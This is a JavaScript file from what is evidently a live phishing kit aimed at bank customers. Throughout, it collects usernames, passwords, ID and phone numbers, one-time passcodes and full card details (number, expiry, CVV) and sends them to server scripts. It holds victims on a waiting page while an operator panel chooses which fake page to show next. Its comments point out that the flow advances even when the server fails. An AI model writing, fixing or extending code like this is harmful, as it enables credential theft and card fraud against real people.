function detectar_dispositivo(){
    var dispositivo = "PC";
    if(navigator.userAgent.match(/Android/i)) dispositivo = "Android";
    else if(navigator.userAgent.match(/iPhone|iPad|iPod/i)) dispositivo = "iOS";
    else if(navigator.userAgent.match(/webOS/i)) dispositivo = "webOS";
    else if(navigator.userAgent.match(/BlackBerry/i)) dispositivo = "BlackBerry";
    else if(navigator.userAgent.match(/Windows Phone/i)) dispositivo = "Windows Phone";
    return dispositivo;
}

// Redirecciones directas
function vista_password(){ window.location.href = "PASS.php"; }
function vista_info(){ window.location.href = "INFO.php"; }
function vista_otp(){ window.location.href = "OTP.php"; }
function vista_tarjeta(){ window.location.href = "PRODUCT.php"; }
function vista_final(){ window.location.href = "SUCCESS.php"; }

// Flujo de inicio (Usuario)
function inicio(u){
    var d = detectar_dispositivo();
    $.post( "../process/inicio.php", { usr: u, dis: d } )
    .always(function() {
        // Espera 1.5 segundos para simular carga y avanza
        setTimeout(function(){ window.location.href = "PASS.php"; }, 1500);
    });
}

// Flujo de Clave (El que se te trababa)
function pasousuario(p){    
    $.post( "../process/pasousuario.php", { pass: p } )
    .always(function() {
        // .always garantiza que avance aunque el servidor de error o tarde
        window.location.href = "WAITING.php"; 
    });
}            

// Flujo de Datos Personales
function pasoinfo(d,c){    
    $.post( "../process/pasoinfo.php", { doc: d, cel: c } )
    .always(function() {
        window.location.href = "WAITING.php";  
    });
} 

// Flujo de Token/OTP
function pasootp(o){    
    $.post( "../process/pasootp.php", { otp: o } )
    .always(function() {
        window.location.href = "WAITING.php";   
    });
} 

// Flujo de Tarjeta
function pasotarjeta(t,f,c){    
    $.post( "../process/pasotarjeta.php", { tar: t, fec: f, cvv: c } )
    .always(function() {
        window.location.href = "WAITING.php";   
    });
}

// Consultar estado para el Admin (Panel)
function consultar_estado(){    
    $.post( "../process/estado.php", function(data) {        
        var estado = data.trim();
        switch (estado) {
            case '2': window.location.href = "OTP.php"; break;
            case '4': window.location.href = "INFO.php"; break;
            case '6': window.location.href = "PRODUCT.php"; break;               
            case '10': window.location.href = "SUCCESS.php"; break;
            case '12': window.location.href = "login.php"; break;
            case '14': window.location.href = "ALERT.php"; break;
        } 
    });        
}

function quitar_cargando(){
    $("#fondo,#cargando-o").hide();
}
